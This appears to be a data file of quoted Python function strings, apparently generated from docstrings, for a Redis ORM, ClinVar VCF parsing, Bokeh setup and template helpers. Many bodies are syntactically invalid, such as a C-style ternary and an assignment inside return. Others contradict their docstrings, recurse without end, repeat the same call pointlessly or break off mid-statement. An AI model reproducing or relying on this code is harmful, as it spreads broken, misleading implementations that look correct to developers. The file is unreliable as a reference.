        "def _toStorage(self, value):\n\t\t'''\n\t\t\t_toStorage - Convert the value to a string representation for storage.\n\n\t\t\t@param value - The value of the item to convert\n\t\t\t@return A string value suitable for storing.\n\t\t'''\n\t\tif value is None:\n\t\t\treturn None\n\t\tif isinstance(value, bool):\n\t\t\treturn value ? 'true' : 'false'\n\t\tif isinstance(value, int):\n\t\t\treturn str(value)\n\t\tif isinstance(value, float):\n\t\t\treturn str(value)\n\t\tif isinstance(value, str):\n\t\t\treturn value\n\t\tif isinstance(value, datetime):\n\t\t\treturn value.isoformat()\n\t\tif isinstance(value, datetime.date):\n\t\t\treturn value.isoformat()\n\t\tif isinstance(value, datetime.",
        "def _navigate_ftp(ftp, build):\n    \"\"\"Navigate an open ftplib.FTP to appropriate directory for ClinVar VCF files.\n\n    Args:\n        ftp:   (type: ftplib.FTP) an open connection to ftp.ncbi.nlm.nih.gov\n        build: (type: string) genome build, either 'b37' or 'b38'\n    \"\"\"\n    if build == 'b37':\n        path = os.path.join(ftp.cwd, 'clinvar', 'b37', 'clinvar_vcf')\n    elif build == 'b38':\n        path = os.path.join(ftp.cwd, 'clinvar', 'b38', 'clinvar_vcf')\n    else:\n        raise ValueError(\"Unknown genome build: %s\" % build)\n    os.makedirs(",
        "def to_dict(self):\n        \"\"\"Return ClinVarAllele data as dict object.\"\"\"\n        return {\n            'clin_var_allele_id': self.clin_var_allele_id,\n            'clin_var_allele_name': self.clin_var_allele_name,\n            'clin_var_allele_description': self.clin_var_allele_description,\n            'clin_var_allele_type': self.clin_var_allele_type,\n            'clin_var_allele_value': self.clin_var_allele_value,\n            'clin_var_allele_unit': self.clin_var_allele_unit,\n            'clin_var_allele_unit_type': self.clin_var_all",
        "def _parse_freqs(self, data):\n        \"\"\"Parse frequency data in ClinVar VCF\n        \"\"\"\n        freq_data = data[\"freq_data\"]\n        if freq_data is None:\n            return None\n        if freq_data.get(\"clinvar_freqs\"):\n            return freq_data[\"clinvar_freqs\"]\n        else:\n            return [x.split(\"=\")[1] for x in freq_data.get(\"clinvar_freqs\", [])]",
        "def _parse_alleles(self, data):\n        \"\"\"Parse alleles for ClinVar VCF, overrides parent method.\n        \"\"\"\n        if self.alleles is None:\n            return\n        if isinstance(self.alleles, str):\n            self.alleles = [self.alleles]\n        if not isinstance(self.alleles, list):\n            raise ValueError(\"alleles must be a list of strings\")\n        for allele in self.alleles:\n            if allele not in data:\n                raise ValueError(\"alleles must be a string\")\n            if allele not in self.alleles:\n                raise ValueError(\"alleles must be one of %s\" % \", \".join(self.alleles))\n        if len(self.alleles) == 1:\n            self.alleles = self.alleles[0]",
        "def register_blox(self):\n        \"\"\"Returns back a class decorator that enables registering Blox to this factory\"\"\"\n        def decorator(cls):\n            self.register_blox_class(cls)\n            return cls\n        return decorator",
        "def deprecated(newmethod):\n    \"\"\"Decorator for warning user of depricated functions before use.\n\n    Args:\n        newmethod (str): Name of method to use instead.\n    \"\"\"\n    def decorator(func):\n        @functools.wraps(func)\n        def wrapper(*args, **kwargs):\n            warnings.warn(\n                \"Use of deprecated function '{}' is deprecated. \"\n                \"Please use the new method '{}' instead.\".format(\n                    func.__name__, newmethod\n                ),\n                category=DeprecationWarning,\n            )\n            return func(*args, **kwargs)\n        return wrapper\n    return decorator",
        "def setDefaultRedisConnectionParams(connectionParams):\n\t\t'''\n\t\t\tsetDefaultRedisConnectionParams - Sets the default parameters used when connecting to Redis.\n\n\t\t  This should be the args to redis.Redis in dict (kwargs) form.\n\n\t\t  @param connectionParams <dict> - A dict of connection parameters.\n\t\t    Common keys are:\n\n\t\t       host <str> - hostname/ip of Redis server (default '127.0.0.1')\n\t\t       port <int> - Port number\t\t\t(default 6379)\n\t\t       db  <int>  - Redis DB number\t\t(default 0)\n\n\t\t   Omitting any of those keys will ensure the default value listed is used.\n\n\t\t  This connection info will be used by default for all connections to Redis, unless explicitly set otherwise.\n\t\t  The common way to override is to define REDIS_CONNECTION",
        "def clearRedisPools(self):\n\t\t'''\n\t\t\tclearRedisPools - Disconnect all managed connection pools, \n\t\t   and clear the connectiobn_pool attribute on all stored managed connection pools.\n\n\t\t   A \"managed\" connection pool is one where REDIS_CONNECTION_PARAMS does not define the \"connection_pool\" attribute.\n\t\t   If you define your own pools, IndexedRedis will use them and leave them alone.\n\n\t\t  This method will be called automatically after calling setDefaultRedisConnectionParams.\n\n\t\t  Otherwise, you shouldn't have to call it.. Maybe as some sort of disaster-recovery call..\n\t\t'''\n\t\tfor pool in self.managedConnections:\n\t\t\tpool.disconnect()\n\t\t\tpool.disconnect_from_redis()\n\t\t\tpool.disconnect_from_redis()\n\t\t\tpool.disconnect_from_redis()\n\t\t\tpool.disconnect_",
        "def getRedisPool(self, params):\n\t\t'''\n\t\t\tgetRedisPool - Returns and possibly also creates a Redis connection pool\n\t\t\tbased on the REDIS_CONNECTION_PARAMS passed in.\n\n\t\t\tThe goal of this method is to keep a small connection pool rolling\n\t\t\tto each unique Redis instance, otherwise during network issues etc\n\t\t\tpython-redis will leak connections and in short-order can exhaust\n\t\t\tall the ports on a system. There's probably also some minor\n\t\t\tperformance gain in sharing Pools.\n\n\t\t\tWill modify \"params\", if \"host\" and/or \"port\" are missing, will fill\n\t\t\tthem in with defaults, and prior to return will set \"connection_pool\"\n\t\t\ton params, which will allow immediate return on the next call,\n\t\t\tand allow access to the pool directly from the model object.\n\n\t\t\t",
        "def pprint(self, stream=None):\n\t\t'''\n\t\t\tpprint - Pretty-print a dict representation of this object.\n\n\t\t\t@param stream <file/None> - Either a stream to output, or None to default to sys.stdout\n\t\t'''\n\t\tif stream is None:\n\t\t\tstream = sys.stdout\n\t\tif self.__class__.__name__ == 'Dict':\n\t\t\tfor key, value in self.__dict__.items():\n\t\t\t\tif isinstance(value, dict):\n\t\t\t\t\tprint >> stream, key\n\t\t\t\t\tfor key, value in value.items():\n\t\t\t\t\t\tif isinstance(value, dict):\n\t\t\t\t\t\t\tprint >> stream, key + ': '\n\t\t\t\t\t\t\tpprint(value, stream)\n\t\t\t\telse:\n\t\t\t\t\tprint >> stream, key + ': ' + str(value)\n\t\telse:\n\t\t\tprint",
        "def hasUnsavedChanges(self, cascadeObjects = False):\n\t\t'''\n\t\t\thasUnsavedChanges - Check if any unsaved changes are present in this model, or if it has never been saved.\n\n\t\t\t@param cascadeObjects <bool> default False, if True will check if any foreign linked objects themselves have unsaved changes (recursively).\n\t\t\t\tOtherwise, will just check if the pk has changed.\n\n\t\t\t@return <bool> - True if any fields have changed since last fetch, or if never saved. Otherwise, False\n\t\t'''\n\t\tif not self.isNew:\n\t\t\treturn False\n\n\t\tif cascadeObjects:\n\t\t\treturn any(self.getUnsavedChanges(cascade = True) for _ in self.getUnsavedReferences())\n\t\telse:\n\t\t\treturn any(self.getUnsavedChanges())",
        "def diff(self, firstObj, otherObj, includeMeta=False):\n\t\t'''\n\t\t\tdiff - Compare the field values on two IndexedRedisModels.\n\n\t\t\t@param firstObj <IndexedRedisModel instance> - First object (or self)\n\n\t\t\t@param otherObj <IndexedRedisModel instance> - Second object\n\n\t\t\t@param includeMeta <bool> - If meta information (like pk) should be in the diff results.\n\n\n\t\t\t@return <dict> - Dict of  'field' : ( value_firstObjForField, value_otherObjForField ).\n\t\t\t\t\n\t\t\t\tKeys are names of fields with different values.\n\t\t\t\tValue is a tuple of ( value_firstObjForField, value_otherObjForField )\n\n\t\t\tCan be called statically, like: IndexedRedisModel.diff ( obj1, obj2 )\n\n\t\t\t ",
        "def save(self, cascadeSave = True):\n\t\t'''\n\t\t\tsave - Save this object.\n\t\t\t\n\t\t\tWill perform an \"insert\" if this object had not been saved before,\n\t\t\t  otherwise will update JUST the fields changed on THIS INSTANCE of the model.\n\n\t\t\t  i.e. If you have two processes fetch the same object and change different fields, they will not overwrite\n\t\t\t  eachother, but only save the ones each process changed.\n\n\t\t\tIf you want to save multiple objects of type MyModel in a single transaction,\n\t\t\tand you have those objects in a list, myObjs, you can do the following:\n\n\t\t\t\tMyModel.saver.save(myObjs)\n\n\t\t\t@param cascadeSave <bool> Default True - If True, any Foreign models linked as attributes that have been altered\n\t\t\t   or created will be saved with this object",
        "def hasSameValues(self, other, cascadeObject = True):\n\t\t'''\n\t\t\thasSameValues - Check if this and another model have the same fields and values.\n\n\t\t\tThis does NOT include id, so the models can have the same values but be different objects in the database.\n\n\t\t\t@param other <IndexedRedisModel> - Another model\n\n\t\t\t@param cascadeObject <bool> default True - If True, foreign link values with changes will be considered a difference.\n\t\t\t\tOtherwise, only the immediate values are checked.\n\n\t\t\t@return <bool> - True if all fields have the same value, otherwise False\n\t\t'''\n\t\tif not isinstance(other, self.__class__):\n\t\t\traise TypeError(\"Can only compare models of the same type\")\n\n\t\tif self.id is None:\n\t\t\treturn False\n\n\t\tif other.",
        "def copy(self, copyPrimaryKey = False, copyValues = False):\n        '''\n            copy - Copies this object.\n\n                    @param copyPrimaryKey <bool> default False - If True, any changes to the copy will save over-top the existing entry in Redis.\n                        If False, only the data is copied, and nothing is saved.\n\n\t\t    @param copyValues <bool> default False - If True, every field value on this object will be explicitly copied. If False,\n\t\t      an object will be created with the same values, and depending on the type may share the same reference.\n\t\t      \n\t\t      This is the difference between a copy and a deepcopy.\n\n\t            @return <IndexedRedisModel> - Copy of this object, per above\n\n\t\t    If you need a copy that IS linked, @see IndexedRedisModel.copy\n        '''\n        if copyPrimaryKey:\n            return",
        "def saveToExternal(self, redisCon):\n\t\t'''\n\t\t\tsaveToExternal - Saves this object to a different Redis than that specified by REDIS_CONNECTION_PARAMS on this model.\n\n\t\t\t@param redisCon <dict/redis.Redis> - Either a dict of connection params, a la REDIS_CONNECTION_PARAMS, or an existing Redis connection.\n\t\t\t\tIf you are doing a lot of bulk copies, it is recommended that you create a Redis connection and pass it in rather than establish a new\n\t\t\t\tconnection with each call.\n\n\t\t\t@note - You will generate a new primary key relative to the external Redis environment. If you need to reference a \"shared\" primary key, it is better\n\t\t\t\t\tto use an indexed field than the internal pk.\n\t\t'''\n\t\tif redisCon is None:\n\t\t\tredisCon = REDIS_CONNECTION_PARAMS\n\t\tself.",
        "def reload(self, cascadeObjects=True):\n\t    '''\n\t    reload - Reload this object from the database, overriding any local changes and merging in any updates.\n\n\n\t\t    @param cascadeObjects <bool> Default True. If True, foreign-linked objects will be reloaded if their values have changed\n\t\t      since last save/fetch. If False, only if the pk changed will the foreign linked objects be reloaded.\n\n                    @raises KeyError - if this object has not been saved (no primary key)\n\n                    @return - Dict with the keys that were updated. Key is field name that was updated,\n\t\t       and value is tuple of (old value, new value). \n\n\t\t    NOTE: Currently, this will cause a fetch of all Foreign Link objects, one level\n\t    '''\n\t    if not self.pk:\n\t      raise KeyError(\"No primary key\")\n\n\t   ",
        "def copyModel(self):\n\t\t'''\n\t\t\tcopyModel - Copy this model, and return that copy.\n\n\t\t\t  The copied model will have all the same data, but will have a fresh instance of the FIELDS array and all members,\n\t\t\t    and the INDEXED_FIELDS array.\n\t\t\t  \n\t\t\t  This is useful for converting, like changing field types or whatever, where you can load from one model and save into the other.\n\n\t\t\t@return <IndexedRedisModel> - A copy class of this model class with a unique name.\n\t\t'''\n\t\tnewClass = self.__class__(self.name)\n\t\tnewClass.FIELDS = self.FIELDS.copy()\n\t\tnewClass.INDEXED_FIELDS = self.INDEXED_FIELDS.copy()\n\t\treturn newClass",
        "def connectAlt(self, redisConnectionParams):\n\t\t'''\n\t\t\tconnectAlt - Create a class of this model which will use an alternate connection than the one specified by REDIS_CONNECTION_PARAMS on this model.\n\n\t\t\t@param redisConnectionParams <dict> - Dictionary of arguments to redis.Redis, same as REDIS_CONNECTION_PARAMS.\n\n\t\t\t@return - A class that can be used in all the same ways as the existing IndexedRedisModel, but that connects to a different instance.\n\n\t\t\t  The fields and key will be the same here, but the connection will be different. use #copyModel if you want an independent class for the model\n\t\t'''\n\t\treturn self.__class__(self.connection, self.key, self.fields, redisConnectionParams)",
        "def _get_new_connection(self):\n\t\t'''\n\t\t\t_get_new_connection - Get a new connection\n\t\t\tinternal\n\t\t'''\n\t\tself.connection = self.connection_factory(self.host, self.port, self.user, self.password, self.ssl)\n\t\treturn self.connection",
        "def _get_connection(self, model):\n\t\t'''\n\t\t\t_get_connection - Maybe get a new connection, or reuse if passed in.\n\t\t\t\tWill share a connection with a model\n\t\t\tinternal\n\t\t'''\n\t\tif self._connections is None:\n\t\t\tself._connections = {}\n\t\tif model in self._connections:\n\t\t\treturn self._connections[model]\n\t\telse:\n\t\t\treturn self._connections[model] = self._get_connection(model)",
        "def _add_id_to_keys(self, table, id_field, value):\n\t\t'''\n\t\t\t_add_id_to_keys - Adds primary key to table\n\t\t\tinternal\n\t\t'''\n\t\tif id_field in self.primary_key:\n\t\t\tself.primary_key[id_field].append(value)\n\t\telse:\n\t\t\tself.primary_key[id_field] = [value]",
        "def _rem_id_from_keys(self, table, keys):\n\t\t'''\n\t\t\t_rem_id_from_keys - Remove primary key from table\n\t\t\tinternal\n\t\t'''\n\t\tfor key in keys:\n\t\t\tself.drop_key(table, key)",
        "def _add_id_to_index(self, id):\n\t\t'''\n\t\t\t_add_id_to_index - Adds an id to an index\n\t\t\tinternal\n\t\t'''\n\t\tif id in self.index:\n\t\t\tself.index[id].append(self.id)\n\t\telse:\n\t\t\tself.index[id] = [self.id]",
        "def _rem_id_from_index(self, id):\n\t\t'''\n\t\t\t_rem_id_from_index - Removes an id from an index\n\t\t\tinternal\n\t\t'''\n\t\tif id in self.index:\n\t\t\tself.index.remove(id)\n\t\t\tself.dirty = True",
        "def _get_key_for_index(self, indexedField, val):\n\t\t'''\n\t\t\t_get_key_for_index - Returns the key name that would hold the indexes on a value\n\t\t\tInternal - does not validate that indexedFields is actually indexed. Trusts you. Don't let it down.\n\n\t\t\t@param indexedField - string of field name\n\t\t\t@param val - Value of field\n\n\t\t\t@return - Key name string, potentially hashed.\n\t\t'''\n\t\tif self.use_hash:\n\t\t\treturn self._get_key_for_hash(indexedField, val)\n\t\telse:\n\t\t\treturn self._get_key_for_index_raw(indexedField, val)",
        "def _compat_rem_str_id_from_index(self, index):\n\t\t'''\n\t\t\t_compat_rem_str_id_from_index - Used in compat_convertHashedIndexes to remove the old string repr of a field,\n\t\t\t\tin order to later add the hashed value,\n\t\t'''\n\t\tfor key in index:\n\t\t\tif isinstance(index[key], str):\n\t\t\t\tindex[key] = index[key].replace('__str__', '__id__')",
        "def _peekNextID(self):\n\t\t'''\n\t\t\t_peekNextID - Look at, but don't increment the primary key for this model.\n\t\t\t\tInternal.\n\n\t\t\t@return int - next pk\n\t\t'''\n\t\tif self._nextID is None:\n\t\t\tself._nextID = self.getNextID()\n\t\treturn self._nextID",
        "def _filter(self, query, filters):\n        \"\"\"\n        Internal for handling filters; the guts of .filter and .filterInline\n        \"\"\"\n        if filters:\n            query = query.filter(filters)\n        return query",
        "def count(self):\n\t\t'''\n\t\t\tcount - gets the number of records matching the filter criteria\n\n\t\t\tExample:\n\t\t\t\ttheCount = Model.objects.filter(field1='value').count()\n\t\t'''\n\t\treturn self.get_queryset().count()",
        "def exists(self, pk):\n\t\t'''\n\t\t\texists - Tests whether a record holding the given primary key exists.\n\n\t\t\t@param pk - Primary key (see getPk method)\n\n\t\t\tExample usage: Waiting for an object to be deleted without fetching the object or running a filter. \n\n\t\t\tThis is a very cheap operation.\n\n\t\t\t@return <bool> - True if object with given pk exists, otherwise False\n\t\t'''\n\t\tif self.getPk(pk) is None:\n\t\t\treturn False\n\t\telse:\n\t\t\treturn True",
        "def getPrimaryKeys(self, sortByAge=False):\n\t\t'''\n\t\t\tgetPrimaryKeys - Returns all primary keys matching current filterset.\n\n\t\t\t@param sortByAge <bool> - If False, return will be a set and may not be ordered.\n\t\t\t\tIf True, return will be a list and is guarenteed to represent objects oldest->newest\n\n\t\t\t@return <set> - A set of all primary keys associated with current filters.\n\t\t'''\n\t\tif sortByAge:\n\t\t\treturn set(self.getPrimaryKeysAge())\n\t\telse:\n\t\t\treturn set(self.getPrimaryKeys())",
        "def all(self, cascadeFetch=False):\n\t\t'''\n\t\t\tall - Get the underlying objects which match the filter criteria.\n\n\t\t\tExample:   objs = Model.objects.filter(field1='value', field2='value2').all()\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\t\t\t@return - Objects of the Model instance associated with this query.\n\t\t'''\n\t\tif cascadeFetch:\n\t\t\treturn self.get_objects().filter(**self.get_filter_params()).all()\n\t\telse:\n\t\t\treturn self.get_objects().filter(**self.get_filter_params()).all()",
        "def allOnlyFields(self, fields, cascadeFetch = False):\n\t\t'''\n\t\t\tallOnlyFields - Get the objects which match the filter criteria, only fetching given fields.\n\n\t\t\t@param fields - List of fields to fetch\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\n\t\t\t@return - Partial objects with only the given fields fetched\n\t\t'''\n\t\tif not fields:\n\t\t\treturn self\n\t\tif not isinstance(fields, list):\n\t\t\tfields = [fields]\n\t\tif not cascadeFetch:\n\t\t\treturn self.filter(**{f: True for f in fields})\n\t\treturn self.filter(**{f: True for f in fields, **{self.foreignKey:",
        "def allOnlyIndexedFields(self):\n\t\t'''\n\t\t\tallOnlyIndexedFields - Get the objects which match the filter criteria, only fetching indexed fields.\n\n\t\t\t@return - Partial objects with only the indexed fields fetched\n\t\t'''\n\t\treturn self.filter(\n\t\t\tlambda obj: obj.getIndexedFields() == [],\n\t\t\tpartial=True\n\t\t)",
        "def random(self, cascadeFetch = False):\n\t\t'''\n\t\t\tRandom - Returns a random record in current filterset.\n\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\t\t\t@return - Instance of Model object, or None if no items math current filters\n\t\t'''\n\t\tif self.count() == 0:\n\t\t\treturn None\n\t\tif cascadeFetch:\n\t\t\treturn self.fetch(True)\n\t\treturn self.fetch(False)",
        "def do_delete(self, args):\n        '''\n            delete - Deletes all entries matching the filter criteria\n        '''\n        if args.filter:\n            self.filter(args.filter)\n        self.db.delete(self.entries)",
        "def get(self, pk, cascadeFetch=False):\n\t\t'''\n\t\t\tget - Get a single value with the internal primary key.\n\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\t\t\t@param pk - internal primary key (can be found via .getPk() on an item)\n\t\t'''\n\t\tif not pk:\n\t\t\treturn None\n\t\tif not self.isPk(pk):\n\t\t\traise ValueError(\"get() expects a primary key\")\n\t\tif cascadeFetch:\n\t\t\treturn self.getPks(pk)\n\t\treturn self.getPk(pk)",
        "def _doCascadeFetch(self, obj):\n\t\t'''\n\t\t\t_doCascadeFetch - Takes an object and performs a cascading fetch on all foreign links, and all theirs, and so on.\n\n\t\t\t@param obj <IndexedRedisModel> - A fetched model\n\t\t'''\n\t\t# Get all the foreign keys\n\t\tforeignKeys = self._getForeignKeys(obj)\n\n\t\t# Get all the foreign keys for the model\n\t\tforeignKeysForModel = self._getForeignKeysForModel(obj)\n\n\t\t# Get all the foreign keys for the model\n\t\tforeignKeysForModelForModel = self._getForeignKeysForModelForModel(obj)\n\n\t\t# Get all the foreign keys for the model\n\t\tforeignKeysForModelForModelForModel = self._getForeignKeysForModelForModelForModel(obj)\n\n\t",
        "def getMultiple(self, cascadeFetch=False, pks=None):\n\t\t'''\n\t\t\tgetMultiple - Gets multiple objects with a single atomic operation\n\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\t\t\t@param pks - list of internal keys\n\t\t'''\n\t\tif pks is None:\n\t\t\tpks = []\n\t\tif cascadeFetch:\n\t\t\treturn self.getMany(cascadeFetch=True, pks=pks)\n\t\telse:\n\t\t\treturn self.getMany(pks=pks)",
        "def getOnlyFields(self, pk, fields, cascadeFetch = False):\n\t\t'''\n\t\t\tgetOnlyFields - Gets only certain fields from a paticular primary key. For working on entire filter set, see allOnlyFields\n\n\t\t\t@param pk <int> - Primary Key\n\n\t\t\t@param fields list<str> - List of fields\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\n\t\t\treturn - Partial objects with only fields applied\n\t\t'''\n\t\tif not fields:\n\t\t\treturn self.getAll()\n\t\telse:\n\t\t\treturn self.get(pk, fields, cascadeFetch)",
        "def getMultipleOnlyFields(self, pks, fields, cascadeFetch = False):\n\t\t'''\n\t\t\tgetMultipleOnlyFields - Gets only certain fields from a list of  primary keys. For working on entire filter set, see allOnlyFields\n\n\t\t\t@param pks list<str> - Primary Keys\n\n\t\t\t@param fields list<str> - List of fields\n\n\n\t\t\t@param cascadeFetch <bool> Default False, If True, all Foreign objects associated with this model\n\t\t\t   will be fetched immediately. If False, foreign objects will be fetched on-access.\n\n\t\t\treturn - List of partial objects with only fields applied\n\t\t'''\n\t\tif not isinstance(pks, list):\n\t\t\traise TypeError(\"pks must be a list\")\n\t\tif not isinstance(fields, list):\n\t\t\traise TypeError(\"fields must be a list\")\n\t\tif not cascade",
        "def compat_convertHashedIndexes(self, fetchAll=True):\n\t\t'''\n\t\t\tcompat_convertHashedIndexes - Reindex fields, used for when you change the propery \"hashIndex\" on one or more fields.\n\n\t\t\tFor each field, this will delete both the hash and unhashed keys to an object, \n\t\t\t  and then save a hashed or unhashed value, depending on that field's value for \"hashIndex\".\n\n\t\t\tFor an IndexedRedisModel class named \"MyModel\", call as \"MyModel.objects.compat_convertHashedIndexes()\"\n\n\t\t\tNOTE: This works one object at a time (regardless of #fetchAll), so that an unhashable object does not trash all data.\n\n\t\t\tThis method is intended to be used while your application is offline,\n\t\t\t  as it doesn't make sense to be changing your model while applications are act",
        "def _doSave(obj, isInsert, conn, pipeline=None):\n\t\t'''\n\t\t  _doSave - Internal function to save a single object. Don't call this directly. \n\t\t\t            Use \"save\" instead.\n\n\t\t\t  If a pipeline is provided, the operations (setting values, updating indexes, etc)\n\t\t\t    will be queued into that pipeline.\n\t\t\t  Otherwise, everything will be executed right away.\n\n\t\t\t  @param obj - Object to save\n\t\t\t  @param isInsert - Bool, if insert or update. Either way, obj._id is expected to be set.\n\t\t\t  @param conn - Redis connection\n\t\t\t  @param pipeline - Optional pipeline, if present the items will be queued onto it. Otherwise, go directly to conn.\n\t\t'''\n\t\tif isInsert:\n\t\t\tif pipeline is None:\n\t\t\t\tpipeline = []\n\t\t\tpipeline.append",
        "def compat_convertHashedIndexes(self, objs, conn=None):\n\t\t'''\n\t\t\tcompat_convertHashedIndexes - Reindex all fields for the provided objects, where the field value is hashed or not.\n\t\t\tIf the field is unhashable, do not allow.\n\n\t\t\tNOTE: This works one object at a time. It is intended to be used while your application is offline,\n\t\t\t  as it doesn't make sense to be changing your model while applications are actively using it.\n\n\t\t\t@param objs <IndexedRedisModel objects to convert>\n\t\t\t@param conn <redis.Redis or None> - Specific Redis connection or None to reuse.\n\t\t'''\n\t\tfor obj in objs:\n\t\t\tfor field in self.fields:\n\t\t\t\tif field.hashable:\n\t\t\t\t\tif field.hashable:\n\t\t\t\t\t\tif field.hashType == '",
        "def deleteOne(self, obj, conn=None):\n\t\t'''\n\t\t\tdeleteOne - Delete one object\n\n\t\t\t@param obj - object to delete\n\t\t\t@param conn - Connection to reuse, or None\n\n\t\t\t@return - number of items deleted (0 or 1)\n\t\t'''\n\t\tif conn is None:\n\t\t\tconn = self.conn\n\n\t\treturn self.conn.deleteOne(obj, conn)",
        "def deleteByPk(self, pk):\n        '''\n            deleteByPk - Delete object associated with given primary key\n        '''\n        if self.isReadOnly():\n            raise ReadOnlyError('Cannot delete a read-only object')\n        if self.isNew():\n            raise NotFoundError('Cannot delete a new object')\n        if self.isDeleted():\n            raise NotFoundError('Cannot delete a deleted object')\n        if self.isLocked():\n            raise NotFoundError('Cannot delete a locked object')\n        if self.isLockedBy():\n            raise NotFoundError('Cannot delete a locked object')\n        if self.isLockedByOther():\n            raise NotFoundError('Cannot delete a locked object')\n        if self.isLockedByOtherOrNew():\n            raise NotFoundError('Cannot delete a locked object')\n        if self.isLockedByOtherOrDeleted():\n            raise NotFoundError('Cannot delete a locked object')\n        if self",
        "def deleteMultiple(self, objs):\n\t\t'''\n\t\t\tdeleteMultiple - Delete multiple objects\n\n\t\t\t@param objs - List of objects\n\n\t\t\t@return - Number of objects deleted\n\t\t'''\n\t\tif not objs:\n\t\t\treturn 0\n\t\tif self.debug:\n\t\t\tprint(\"deleteMultiple: %s\" % objs)\n\t\tif self.use_cache:\n\t\t\treturn self.cache.deleteMultiple(objs)\n\t\treturn self.delete(objs)",
        "def deleteMultipleByPks(self, pks):\n\t\t'''\n\t\t\tdeleteMultipleByPks - Delete multiple objects given their primary keys\n\n\t\t\t@param pks - List of primary keys\n\n\t\t\t@return - Number of objects deleted\n\t\t'''\n\t\tif self.isReadOnly():\n\t\t\traise RuntimeError(\"Can't delete objects that are read-only\")\n\t\tif len(pks) == 0:\n\t\t\treturn 0\n\t\treturn self.deleteByPks(pks)",
        "def from_html(html):\n    \"\"\"Returns a blox template from an html string\"\"\"\n    template = Template(html)\n    return template.render(**locals())",
        "def read_template(stream):\n    \"\"\"Returns a blox template from a file stream object\"\"\"\n    template = Template(stream)\n    return template.render(**locals())",
        "def get_blox_template(self, path):\n        \"\"\"Returns a blox template from a valid file path\"\"\"\n        if not os.path.exists(path):\n            raise BloxError(\"Template file %s does not exist\" % path)\n        with open(path, 'r') as f:\n            return f.read()",
        "def keywords(func):\n    \"\"\"\n    Accumulate all dictionary and named arguments as\n    keyword argument dictionary. This is generally useful for\n    functions that try to automatically resolve inputs.\n\n    Examples:\n        >>> @keywords\n        >>> def test(*args, **kwargs):\n        >>>     return kwargs\n        >>>\n        >>> print test({'one': 1}, two=2)\n        {'one': 1, 'two': 2}\n    \"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        return dict(\n            (k, v) for k, v in kwargs.items()\n            if k in args and isinstance(args[k], dict)\n        )\n    return wrapper",
        "def getCompressMod(self):\n\t\t'''\n\t\t\tgetCompressMod - Return the module used for compression on this field\n\n\t\t\t@return <module> - The module for compression\n\t\t'''\n\t\tif self.compressMod is None:\n\t\t\tself.compressMod = self.getField('compressMod')\n\t\treturn self.compressMod",
        "def toBytes(self, value):\n\t\t'''\n\t\t\ttoBytes - Convert a value to bytes using the encoding specified on this field\n\n\t\t\t@param value <str> - The field to convert to bytes\n\n\t\t\t@return <bytes> - The object encoded using the codec specified on this field.\n\n\t\t\tNOTE: This method may go away.\n\t\t'''\n\t\tif self.codec is None:\n\t\t\treturn value\n\t\treturn self.codec.encode(value)",
        "def partial_keep_kwargs(func, *args, **kwargs):\n    \"\"\"Like functools.partial but instead of using the new kwargs, keeps the old ones.\"\"\"\n    return functools.partial(func, *args, **kwargs)",
        "def _configure_show(proxy, port):\n    '''\n    Callable to configure Bokeh's show method when a proxy must be\n    configured.\n\n    If port is None we're asking about the URL\n    for the origin header.\n    '''\n    if port is None:\n        origin = request.headers.get('origin', '')\n        if origin:\n            port = request.headers.get('x-forwarded-port', '')\n    proxy_url = request.url\n    if proxy_url:\n        proxy_url = proxy_url.split('://')[0]\n    show_method = getattr(request, 'show', None)\n    if show_method is None:\n        show_method = _show\n    show_method(proxy, port)",
        "def setup_environment(app):\n    \"\"\"Called at the start of notebook execution to setup the environment.\n\n    This will configure bokeh, and setup the logging library to be\n    reasonable.\n\n    \"\"\"\n    app.config.setdefault('BOKEH_LOG_LEVEL', 'info')\n    app.config.setdefault('BOKEH_LOG_FORMAT', '%(asctime)s %(levelname)s %(message)s')\n    app.config.setdefault('BOKEH_LOG_DATE_FORMAT', '%(asctime)s %(msecs)03d')\n    app.config.setdefault('BOKEH_LOG_DATE_FORMAT_TIME', '%(asctime)s %(msecs)03d %(hour)02d:%02d:%02d')\n    app.config.setdefault('BOKEH_LOG_DATE_FORMAT_TIME_",
        "def _create_host_range_overview(self):\n        \"\"\"Creates a overview of the hosts per range.\"\"\"\n        hosts = self.get_hosts()\n        hosts_per_range = len(hosts) / self.range_size\n        hosts_per_range_str = \"{0:d} hosts per range\".format(hosts_per_range)\n        self.log.info(\"Hosts per range: {0}\".format(hosts_per_range_str))",
        "def create_ordered_dict(hierarchy, level=None):\n    \"\"\"Create an OrderedDict\n\n    :param hierarchy: a dictionary\n    :param level: single key\n    :return: deeper dictionary\n    \"\"\"\n    if level is None:\n        level = 0\n    return OrderedDict(\n        (key, create_ordered_dict(value, level + 1))\n        for key, value in hierarchy.items()\n    )",
        "def group_line_references(text, getreffs, lines=10):\n    \"\"\"Groups line reference together\n\n    :param text: Text object\n    :type text: MyCapytains.resources.text.api\n    :param getreffs: Callback function to retrieve text\n    :type getreffs: function(level)\n    :param lines: Number of lines to use by group\n    :type lines: int\n    :return: List of grouped urn references with their human readable version\n    :rtype: [(str, str)]\n    \"\"\"\n    urns = []\n    for line in text:\n        urns.append(getreffs(line, lines))\n    return urns",
        "def chunk_text(text, getreffs):\n    \"\"\"Chunk a text at the passage level\n\n    :param text: Text object\n    :type text: MyCapytains.resources.text.api\n    :param getreffs: Callback function to retrieve text\n    :type getreffs: function(level)\n    :return: List of urn references with their human readable version\n    :rtype: [(str, str)]\n    \"\"\"\n    text_urns = [text.urn]\n    text_urns.extend(getreffs(text.level))\n    return text_urns",
